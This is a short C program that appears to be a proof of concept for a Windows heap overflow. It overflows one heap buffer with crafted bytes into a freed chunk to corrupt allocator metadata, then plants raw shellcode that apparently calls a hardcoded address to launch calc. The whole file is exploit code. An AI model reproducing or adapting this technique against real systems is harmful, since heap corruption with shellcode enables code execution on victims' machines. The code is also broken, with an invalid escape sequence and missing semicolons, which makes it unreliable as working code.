#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc,char *argv[]){
    long* hHeap=HeapCreate(0x00040000,0,0);
    char *buff1,*buff2,*buff3;
    buff1=HeapAlloc(hHeap,0,0x10);
    buff2=HeapAlloc(hHeap,0,0x10);
    HeapFree(hHeap,0,buff2);

    strcpy(buff1,"BBBBBBBBBBBBBBBBBBAAAABBB\x0x\x40\xab\x71");
    buff2=HeapAlloc(hHeap,0,0x10)
    buff3=HeapAlloc(hHeap,0,0x10)
    strcpy(buff3,"\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0");
    HeapFree(hHeap,0,buff3);
    HeapFree(hHeap,0,buff2);
    HeapFree(hHeap,0,buff1); 

    return 0;




}